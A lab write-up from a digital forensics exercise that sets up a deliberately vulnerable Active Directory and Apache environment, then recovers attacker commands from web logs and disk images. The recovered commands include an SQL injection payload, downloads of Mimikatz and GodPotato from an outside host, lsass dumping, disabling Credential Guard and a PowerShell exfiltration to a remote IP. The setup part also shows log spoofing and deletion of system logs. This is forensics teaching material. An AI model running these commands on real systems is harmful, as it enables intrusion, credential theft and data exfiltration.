## 1. Scenario
#### 1.1. Background
This project was done as a part of **Hspace Digital Forensics Lab(HDFL)** activity. As part of production team 1, we created a incident scenario for the other teams to investigate. 

In this post, I will describe how the environment was set up, how the attack was performed, then analyze the disk images to learn what kind of artifacts are left and where. 

#### 1.2. Initializing Environment
We first created an AD environment with 3 machines. The **Domain Controller(DC01)**, **MSSQL Database Server(DB01)**, and the **user PC**.

Outside of the AD, we also created a **Linux webserver** to host an Apache webserver. 

I was in charge of initializing the user PC and the webserver. 

###### User PC setup
The user PC was created using a Windows 10 22H2 iso file. After setting up Windows, I joined the AD and created some dummy data.
- Chrome history 
- work pdf files
![[work_pdf_files.png]]
- customer list
![[Customer_list.png]]
- password txt file
![[password_file.png]]
- contacts list
![[contacts_file.png]]

###### Webserver setup
The webserver was created using Ubuntu Server 22.04.5 LTS. After creation, I first downloaded necessary tools to set up the server:
``` sh
sudo apt update && apt-cache policy php
sudo apt install apache2 php php-dev php-pear unixodbc-dev curl -y

curl -sS https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/microsoft.gpg > /dev/null
curl -sS https://packages.microsoft.com/config/ubuntu/22.04/prod.list | sudo tee /etc/apt/sources.list.d/mssql-release.list
sudo apt update
sudo ACCEPT_EULA=Y apt-get install -y msodbcsql18 mssql-tools18
sudo pecl channel-update pecl.php.net
sudo pecl install sqlsrv-5.11.1
sudo pecl install pdo_sqlsrv-5.11.1

sudo sh -c 'echo "extension=sqlsrv.so" > /etc/php/8.1/mods-available/sqlsrv.ini'
sudo sh -c 'echo "extension=pdo_sqlsrv.so" > /etc/php/8.1/mods-available/pdo_sqlsrv.ini'

sudo phpenmod sqlsrv pdo_sqlsrv
sudo systemctl restart apache2
php -m | grep sqlsrv
```

Next, *index.php* and *index.html* were moved to `/var/www/html` to be hosted. *index.php* contains an intentional SQLi vulnerability. They can be found at [[Webserver files]]. 

Other dummy html files were added to the directory as well, under directories `1`, `2`, `3`, `4`, and `5`.

I also needed a webshell that the admin could use to run various commands on the webserver after logging in. This is implemented in `secure/webshell.php`. This file can be found under [[Webserver files]]. 

Finally, I used *certbot* to get a certificate for `deceptiverat.xyz`, which is where I would host the webserver.
``` sh
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/local/bin/certbot
sudo certbot --apache
```

###### Spoofing Apache access logs
To keep the challenge from being too easy for the investigators, I decided to add some fake access logs. I could just create a log generator and copy and paste that log into `/var/log/apache2/access.log`, but I wanted it to be more authentic.

I was thinking about how to do this when I found out I could spoof IP addresses using IP Aliasing. I created a host-only network for the webserver VM with IP range 1.1.0.0./16, which contains the attacking machine IP, created another Linux machine with multiple IPs assigned, and used a Python script to test this. Sure enough, I was able to create access logs from multiple IPs with just 1 machine. 

This was done by (1) assigning more IPs to the attacking machine network interface (2) adding "deceptiverat.xyz" to `/etc/hosts` with IP `1.1.0.4` (3) using a python script to create and send spoofed packets. The shell command for assigning more IPs and the Python script can be found at [[Webserver files]].

Unfortunately, this meant I had to disconnect the webserver from the Internet (because it would have to be connected to the host-only network) when I wanted to add benign logs, but I figured we could pause the attack every once in a while to add benign logs. 

Another unfortunate consequence of this method was that changing the network interface of the webserver generated logs as well:
- `sudo journalctl -u systemd-networkd -n 50`
![[systemd-networkd_logs.png]]
- `sudo tail -n 50 /var/log/kern.log`
![[kern_log.png]]

After discussing with my teammates, we decided to remove these logs. I used *vim* to remove certain lines containing network interface change logs. 

``` sh
$ sudo rm -rf /var/log/journal/*
$ sudo vim /var/log/syslog
$ sudo vim /var/log/kern.log
$ sudo vim /var/log/auth.log
```

###### DB set up
To allow command execution via SQLi, the DB account for the webserver has to have sysadmin privileges. So I created an account **webapp_admin** with sysadmin privileges and used the credentials in *index.php*. 

Also, we needed a database of user accounts that could login to the webserver, so I created a table for that as well:
![[DB_create_table.png]]

#### 1.3. Attack flow
The attack flow is as follows:
``` plaintext
[C2]    =========================> [WEB01] (Webserver)
			     (SQLi)

[WEB01] =========================> [DB01] (MSSQL server)
			  (xp_cmdshell)

[DB01]  =========================> [DC01] (Domain Controller)
		 (lsass credential dump)

[DC01]  =========================> [User PC] 
		 	 (remote login)
```

The attack was not performed by me and will not be dicussed further here. 

## 2. Analysis
#### 2.1. Webserver
Let's start with the Linux Webserver to see what we can find. 
``` sh
$ fdisk -l webserver_image.raw
Disk webserver_image.raw: 25 GiB, 26843545600 bytes, 52428800 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: CEA0B653-E172-4771-8D65-B2E0A621C281

Device                 Start      End  Sectors Size Type
webserver_image.raw1    2048     4095     2048   1M BIOS boot
webserver_image.raw2    4096  4198399  4194304   2G Linux filesystem
webserver_image.raw3 4198400 52426751 48228352  23G Linux filesystem
$ fsstat -o 4198400 webserver_image.raw
Cannot determine file system type
$ dd if=webserver_image.raw bs=512 skip=4198400 count=100 2>/dev/null | file -
/dev/stdin: LVM2 PV (Linux Logical Volume Manager), UUID: eo7cZb-UtVx-UCn6-3p6H-qi5Z-RdjP-E5ZmHf, size: 24692916224
```

##### Mounting partition

The root partition uses *Logical Volume Manager(LVM)* so first, I have to mount the disk.

``` sh
$ sudo losetup -fP webserver_image.raw
$ sudo vgscan
$ sudo vgchange -ay ubuntu-vg
$ sudo fsstat /dev/mapper/ubuntu--vg-ubuntu--lv | head -n 100
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext4
Volume Name:
Volume ID: 26ef4e0cd71e8b86e94090e4a1abafdb

Last Written at: 2026-05-26 22:25:04 (KST)
Last Checked at: 2026-05-21 08:51:15 (KST)

Last Mounted at: 2026-05-26 22:25:05 (KST)
Unmounted properly
Last mounted on: /

Source OS: Linux
Dynamic Structure
Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index
InCompat Features: Filetype, Needs Recovery, Extents, 64bit, Flexible Block Groups,
Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size
[REMOVED]
```

##### Analyzing *Apache* logs
``` sh
$ sudo fls -f linux-ext4 -a /dev/mapper/ubuntu--vg-ubuntu--lv 2 | grep var
d/d 19: var
$ sudo fls -f linux-ext4 -a /dev/mapper/ubuntu--vg-ubuntu--lv 19 | grep log
d/d 27: log
$ sudo fls -f linux-ext4 -a /dev/mapper/ubuntu--vg-ubuntu--lv 27 | grep apache
d/d 3789:       apache2
$ sudo fls -f linux-ext4 -a /dev/mapper/ubuntu--vg-ubuntu--lv 3789 
d/d 3789:       .
d/d 27: ..
r/r 3419:       error.log
r/r 3107:       access.log
r/r 4315:       other_vhosts_access.log
r/r 1615:       error.log.2.gz
r/r 4314:       error.log.3.gz
r/r 1614:       access.log.2.gz
r/r 4313:       access.log.1
r/r 4747:       access.log.3.gz
r/r 4748:       error.log.1
```

Let's start with the oldest log, *access.log.3.gz*. 

``` sh
$ sudo icat -f linux-ext4 /dev/mapper/ubuntu--vg-ubuntu--lv 4747 > access.log.3.gz
$ gzip -d access.log.3.gz 
$ vim access.log.3
```

All logs are from May 21st and 22nd, testing the connection and making sure everything is working properly. 

Next is *access.log.2.gz*. 

``` sh
$ sudo icat -f linux-ext4 /dev/mapper/ubuntu--vg-ubuntu--lv 1614 > access.log.2.gz
$ gzip -d access.log.2.gz
```

This file contains logs for the 25th. It is the first day of the attack, and we should be able to find many signs of intrusion in this file. 

``` sh
$ head -n 10 access.log.2
2.2.81.61 - - [25/May/2026:03:50:13 +0000] "GET / HTTP/1.1" 200 1385 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"
1.1.25.109 - - [25/May/2026:03:50:58 +0000] "GET / HTTP/1.1" 200 3623 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:50:58 +0000] "GET /favicon.ico HTTP/1.1" 404 517 "https://deceptiverat.xyz/" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/index.html HTTP/1.1" 200 4053 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/assets/css/main.css HTTP/1.1" 200 6784 "https://deceptiverat.xyz/1/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/assets/js/jquery.min.js HTTP/1.1" 200 31704 "https://deceptiverat.xyz/1/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/assets/js/browser.min.js HTTP/1.1" 200 1270 "https://deceptiverat.xyz/1/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/images/pic01.jpg HTTP/1.1" 200 10396 "https://deceptiverat.xyz/1/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/assets/css/fontawesome-all.min.css HTTP/1.1" 200 13289 "https://deceptiverat.xyz/1/assets/css/main.css" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:03:53:45 +0000] "GET /1/assets/js/breakpoints.min.js HTTP/1.1" 200 1517 "https://deceptiverat.xyz/1/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
```

The first logs show the attacker at `1.1.25.109` scanning the Webserver. 

``` sh
$ cat access.log.2 | grep POST | head -n 5
1.1.25.109 - - [25/May/2026:03:57:26 +0000] "POST /index.php HTTP/1.1" 200 752 "https://deceptiverat.xyz/" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:04:00:19 +0000] "POST /index.php HTTP/1.1" 200 681 "https://deceptiverat.xyz/" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:04:02:23 +0000] "POST /index.php HTTP/1.1" 200 2942 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:02:27 +0000] "POST /index.php?YCvM=6869%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 2883 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:02:30 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
```

In line 4 at `25/May/2026:04:02:27 +0000`, we can see the attacker attempted something suspicious.

``` plaintext
POST /index.php?YCvM=6869%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
=(URL decode)=>
POST /index.php?YCvM=6869 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
```

The payload attempts to dump `table_name` and use `xp_cmdshell` to print `/etc/passwd` of the DB server. Even though the attack did not succeed, we can use this to pinpoint the start of the attack.

``` sh
$ cat access.log.2 | grep -E -e "25\/May\/2026:04:[0-9]{2}:[0-9]{2} \+0000" | grep -e "1.1.25.109"
[REMOVED]
1.1.25.109 - - [25/May/2026:04:02:30 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:02:33 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:02:36 +0000] "POST /index.php HTTP/1.1" 200 2883 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:02:40 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:03:02 +0000] "POST /index.php HTTP/1.1" 200 2885 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:03:05 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
1.1.25.109 - - [25/May/2026:04:03:08 +0000] "POST /index.php HTTP/1.1" 200 2885 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
[REMOVED]
1.1.25.109 - - [25/May/2026:04:09:38 +0000] "POST /index.php HTTP/1.1" 200 2883 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
1.1.25.109 - - [25/May/2026:04:09:43 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
1.1.25.109 - - [25/May/2026:04:09:43 +0000] "POST /index.php HTTP/1.1" 200 2884 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
1.1.25.109 - - [25/May/2026:04:17:34 +0000] "GET /secure/webshell.php HTTP/1.1" 403 3110 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:04:17:53 +0000] "GET /secure/webshell.php?cmd=whoami HTTP/1.1" 403 871 "https://deceptiverat.xyz/secure/webshell.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
1.1.25.109 - - [25/May/2026:04:18:40 +0000] "GET /secure/webshell.php HTTP/1.1" 403 871 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
[REMOVED]
```

After a few minutes of what seems to be automated attempts, the attacker manages to gain access to *webshell.php*, allowing them to execute arbitrary commands. 

Let's see what commands the attacker ran. We can improve readability by extracting the string that comes after "cmd=".

``` sh
# print, extract command, and URL decode
$ cat access.log.2 | sed -n 's/.*webshell\.php?cmd=\([^ ]*\) HTTP\/1\.1.*/\1/p' | python3 -c "import sys; from urllib.parse import unquote_plus; print(unquote_plus(sys.stdin.read()));"
whoami
whoami
hostname
ip a
ipconfig
ifconfig
pwd
ls -al
ls ..
cat ../index.php
head -20 ../index.php
find .. -type f
grep -n server ../index.php
nc -vz 3.3.152.162 1433
[REMOVED]
```

The attacker performs some reconnaissance and finds IP of the MSSQL server and credentials for it. 

``` sh
[REMOVED]
php -r '$conn = sqlsrv_connect("3.3.152.162", array("UID"=>"webapp_admin","PWD"=>"webapp_admin123","TrustServerCertificate"=>true)); sqlsrv_query($conn, "EXEC sp_configure '\''show advanced options'\'',1; RECONFIGURE;"); echo "DONE";'
[REMOVED]
```

`xp_cmdshell` is enabled. This means the attacker can use it to execute commands on the MSSQL server.

To improve readability, let's extract the commands that run with `xp_cmdshell`.

```sh 
# print, extract command, URL decode, extract command again
$ cat access.log.2 | sed -n 's/.*webshell\.php?cmd=\([^ ]*\) HTTP\/1\.1.*/\1/p' | python3 -c "import sys; from urllib.parse import unquote_plus; print(unquote_plus(sys.stdin.read()));" | sed -n "s/.*xp_cmdshell '\\\\''\(.*\)'\\\\'.*/\1/p"
whoami
hostname
ipconfig
whoami /all
nltest /dclist:hdflab.local
[REMOVED]
net user backupsvc S3rvice!2026 /add
net localgroup administrators backupsvc /add
[REMOVED]
```

The attacker creates a account, "backupsvc", and adds it to the local admin group. 

``` sh
[REMOVED]
powershell -c \"Invoke-WebRequest http://2.2.81.61:9999/spoolsvc.exe -OutFile C:\\ProgramData\\spoolsvc.exe\"
dir C:\\ProgramData\\spoolsvc.exe
C:\\ProgramData\\spoolsvc.exe -cmd \"cmd /c whoami > C:\\ProgramData\\sys.txt\"
type C:\\ProgramData\\sys.txt
powershell -c \"Invoke-WebRequest http://2.2.81.61:9999/adobe_updater.exe -OutFile C:\\ProgramData\\adobe_updater.exe\"
powershell -c \"Invoke-WebRequest http://2.2.81.61:9999/adob_updater.exe -OutFile C:\\ProgramData\\adob_updater.exe\"
dir C:\\ProgramData\\adob_updater.exe
C:\\ProgramData\\adobe_updater.exe privilege::debug sekurlsa::logonpasswords exit
dir C:\\ProgramData\\adob_updater.exe
C:\\ProgramData\\adobe_updater.exe privilege::debug sekurlsa::logonpasswords exit
C:\\ProgramData\\adob_updater.exe privilege::debug sekurlsa::logonpasswords exit
[REMOVED]
```

Multiple tools are downloaded from `2.2.81.61` disguised as benign executables. *spoolsvc.exe* is *GodPotato* and *adobe_updater.exe* is *Mimikatz*.

``` sh
[REMOVED]
reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL
query user
reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard\" /v Enabled
powershell -c \"Get-MpComputerStatus | select RealTimeProtectionEnabled\"
reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard\" /v Enabled /t REG_DWORD /d 0 /f
reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
```

After some more reconnaissance, the first day is over. 

``` sh
$ sudo icat -f linux-ext4 /dev/mapper/ubuntu--vg-ubuntu--lv 4313 > access.log.1
$ head access.log.1
1.1.35.34 - - [26/May/2026:03:17:52 +0000] "POST / HTTP/1.1" 200 3639 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/605.1.15"
1.1.35.34 - - [26/May/2026:03:17:52 +0000] "GET /2/index.html HTTP/1.1" 200 6532 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/605.1.15"
1.1.35.34 - - [26/May/2026:03:17:55 +0000] "GET /1/index.html HTTP/1.1" 200 6309 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/605.1.15"
1.1.25.40 - - [26/May/2026:03:17:56 +0000] "GET /4/index.html HTTP/1.1" 200 6567 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
1.1.32.45 - - [26/May/2026:03:17:58 +0000] "GET /2/index.html HTTP/1.1" 200 6531 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
1.1.25.40 - - [26/May/2026:03:17:58 +0000] "GET /5/index.html HTTP/1.1" 200 5051 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
1.1.25.40 - - [26/May/2026:03:18:01 +0000] "GET /5/index.html HTTP/1.1" 200 5052 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
1.1.32.45 - - [26/May/2026:03:18:02 +0000] "GET /index.html HTTP/1.1" 200 3640 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
1.1.25.40 - - [26/May/2026:03:18:03 +0000] "GET /index.html HTTP/1.1" 200 3640 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
1.1.25.40 - - [26/May/2026:03:18:06 +0000] "GET /index.html HTTP/1.1" 200 3641 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
```

The second day starts with some benign logs. 

``` sh
$ cat access.log.1 | sed -n 's/.*webshell\.php?cmd=\([^ ]*\) HTTP\/1\.1.*/\1/p' | python3 -c "import sys; from urllib.parse import unquote_plus; print(unquote_plus(sys.stdin.read()));" | sed -n "s/.*xp_cmdshell '\\\\''\(.*\)'\\\\'.*/\1/p"
[REMOVED]
C:\\ProgramData\\adobe_update.exe privilege::debug sekurlsa::logonpasswords exit
cmd /c C:\\ProgramData\\adobe_update.exe privilege::debug sekurlsa::logonpasswords exit > C:\\ProgramData\\creds.txt 2>&1
type C:\\ProgramData\\creds.txt
[REMOVED]
tasklist | findstr lsass.exe
C:\\ProgramData\\spoolsvc.exe -cmd \"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\ProgramData\\lsass.dmp full\"
dir C:\\ProgramData\\lsass.dmp
powershell Compress-Archive -Path C:\\ProgramData\\lsass.dmp -DestinationPath C:\\ProgramData\\backup_2026.zip
dir C:\\ProgramData\\backup_2026.zip
[REMOVED]
powershell -c \"\$f=[System.IO.File]::ReadAllBytes('\"'\"'C:\\ProgramData\\backup_2026.zip'\"'\"'); \$c=New-Object System.Net.Sockets.TcpClient('\"'\"'2.2.81.61'\"'\"',9999); \$s=\$c.GetStream(); \$s.Write(\$f,0,\$f.Length); \$s.Close(); \$c.Close()\"
[REMOVED]
powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\exfil.ps1
certutil -hashfile C:\\ProgramData\\backup_2026.zip SHA256
[REMOVED]
```

Using the same method as before, we can see the commands that were run on the MSSQL server.

It seems *Mimikatz* didn't work so the attacker dumped *lsass.exe* and exfiltrated it in an attempt to find some valid credentials. 

``` sh
[REMOVED]
net view
ipconfig
arp -a
[REMOVED]
nltest /dclist:corp.local
nltest /dclist:HDFLAB
net user /domain
net group \"Domain Admins\" /domain
net group \"Domain Computers\" /domain
ping DESKTOP-BAH7OUO
cmd /c dir \"\\\\DESKTOP-BAH7OUO\\C$\"
net user svc_backup /domain
net group /domain
net group \"SQL_Service_Accounts\" /domain
[REMOVED]
```

More reconnaissance of the domain.  

``` sh
[REMOVED]
del /f /q C:\\ProgramData\\lsass.dmp
del /f /q C:\\ProgramData\\lsass.dmp
del /f /q C:\\ProgramData\\backup_2026.zip
[REMOVED]
```

Deleted artifacts left. 

``` sh
[REMOVED]
dir C:\\ProgramData
cmd /c dir \"\\\\DESKTOP-BAH7OUO\\C$\"
net view \\\\\\\\DESKTOP-BAH7OUO
cmd /c dir \"\\\\DESKTOP-BAH7OUO\\SharedDocs\"
cmd /c dir \"\\\\DESKTOP-BAH7OUO\\Shared\"
net use \\\\\\\\DESKTOP-BAH7OUO\\IPC$
net use \\\\\\\\DESKTOP-BAH7OUO\\IPC$ /user:HDFLAB\\dbadmin \"Dbhspace1!\"
net use \\\\\\\\DESKTOP-BAH7OUO\\IPC$ /user:HDFLAB\\dbadmin \"Dbhspace1!\"
[REMOVED]
```

Attempts to access a machine using credentials found in *lsass.dmp*.

``` sh
[REMOVED]
tasklist | findstr lsass.exe
C:\\ProgramData\\spoolsvc.exe -cmd \"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\ProgramData\\lsass.dmp full\"
dir C:\\ProgramData\\lsass.dmp
powershell Compress-Archive -Path C:\\ProgramData\\lsass.dmp -DestinationPath C:\\ProgramData\\backup_2026.zip
dir C:\\ProgramData\\backup_2026.zip
powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\exfil.ps1
del /f /q C:\\ProgramData\\lsass.dmp & del /f /q C:\\ProgramData\\backup_2026.zip & del /f /q C:\\ProgramData\\exfil.ps1
powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\exfil.ps1
dir C:\\ProgramData\\backup_2026.zip
del /f /q C:\\ProgramData\\lsass.dmp & del /f /q C:\\ProgramData\\backup_2026.zip & del /f /q C:\\ProgramData\\exfil.ps1
rmdir /s /q C:\\ProgramData\\cache
[REMOVED]
```

Because the previous credentials were not enough to grant entry to the user PC, *lsass.exe* is dumped again to find another set of credentials. 

``` sh
[REMOVED]
net use * /delete /y
net use \\\\\\\\DESKTOP-BAH7OUO\\SharedDocs /user:HDFLAB\\john.doe \"John1283!@#\"
net use \\\\\\\\DESKTOP-BAH7OUO\\C$ /user:HDFLAB\\john.doe \"John1283!@#\"
dir \\\\\\\\DESKTOP-BAH7OUO\\Users
dir \\\\DESKTOP-BAH7OUO\\Users
dir \\\\DESKTOP-BAH7OUO\\Users\\john.doe
net use Z: \\\\DESKTOP-BAH7OUO\\Users /user:HDFLAB\\john.doe \"John1283!@#\"
dir Z:
dir Z:\\john.doe
dir Z:\\john.doe\\Documents
dir Z:\\john.doe\\Desktop
dir "Z:\\john.doe\\Desktop\\업무용"
dir \"Z:\\john.doe\\Desktop\\업무용\"
mkdir C:\\ProgramData\\cache
copy "Z:\\john.doe\\Desktop\\업무용\\*.txt" C:\\ProgramData\\cache\\
xcopy /E /I /Y "Z:\\john.doe\\Desktop\\업무용\\결재보고서" C:\\ProgramData\\cache\\결재보고서
copy \"Z:\\john.doe\\Desktop\\업무용\\*.txt\" C:\\ProgramData\\cache\\
xcopy /E /I /Y \"Z:\\john.doe\\Desktop\\업무용\\결재보고서\" C:\\ProgramData\\cache\\결재보고서
xcopy /E /I /Y \"Z:\\john.doe\\Desktop\\업무용\\대외비\" C:\\ProgramData\\cache\\대외비
dir C:\\ProgramData\\cache
powershell Compress-Archive -Path C:\\ProgramData\\cache\\* -DestinationPath C:\\ProgramData\\corp_docs.zip
$q
powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\exfil.ps1
del /f /q C:\\ProgramData\\corp_docs.zip & del /f /q C:\\ProgramData\\exfil.ps1 & rmdir /s /q C:\\ProgramData\\cache
```

Using the new set of credentials, the attacker accesses the shared folder and extracts the data inside, compresses it, and exfiltrates it. Used files are deleted as well. 

#### 2.2. MSSQL server

Even the *Apache* logs alone are enough to paint a picture of how the attack went. But because my goal is to find as many artifacts and correlate them, I will analyze artifacts in the MSSQL server next. 

##### Finding root directory
Using *mmls*, let's check the MSSQL server image.

``` sh
$ mv DB01.vmdk generated-stream.vmdk
$ mmls generated-stream.vmdk
GUID Partition Table (EFI)
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Safety Table
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  Meta      0000000001   0000000001   0000000001   GPT Header
003:  Meta      0000000002   0000000033   0000000032   Partition Table
004:  000       0000002048   0000411647   0000409600   Basic data partition
005:  001       0000411648   0000444415   0000032768   Microsoft reserved partition
006:  002       0000444416   0082139135   0081694720   Basic data partition
007:  003       0082139136   0083881983   0001742848
008:  -------   0083881984   0083886079   0000004096   Unallocated
```

The FS partition seems to start at partition 6, which is at offset 444,416. 

``` sh
$ fsstat -o 444416 generated-stream.vmdk
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: NTFS
Volume Serial Number: B4322A43322A0B46
OEM Name: NTFS
Version: Windows XP

METADATA INFORMATION
--------------------------------------------
First Cluster of MFT: 786432
First Cluster of MFT Mirror: 2
Size of MFT Entries: 1024 bytes
Size of Index Records: 4096 bytes
Range: 0 - 214016
Root Directory: 5
[REMOVED]
```

##### Analyzing *Sysmon* events
*Sysmon* was installed on the MSSQL server and it should contain an abundance of logs. 

Using the root directory, let's find the *.evtx* file for *Sysmon* at `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx`. 

``` sh
$ fls -o 444416 generated-stream.vmdk 5 | grep Windows
d/d 1960-144-9: Windows
$ fls -o 444416 generated-stream.vmdk 1960 | grep System32
d/d 5234-144-7: System32
$ fls -o 444416 generated-stream.vmdk 5234 | grep winevt
d/d 6604-144-1: winevt
$ fls -o 444416 generated-stream.vmdk 6604 | grep Logs
d/d 6605-144-6: Logs
$ fls -o 444416 generated-stream.vmdk 6605 | grep Sysmon
r/r 211746-128-4:       Microsoft-Windows-Sysmon%4Operational.evtx
$ icat -o 444416 generated-stream.vmdk 211746 > Sysmon.evtx
$ EvtxECmd -f Sysmon.evtx  --csv .
```

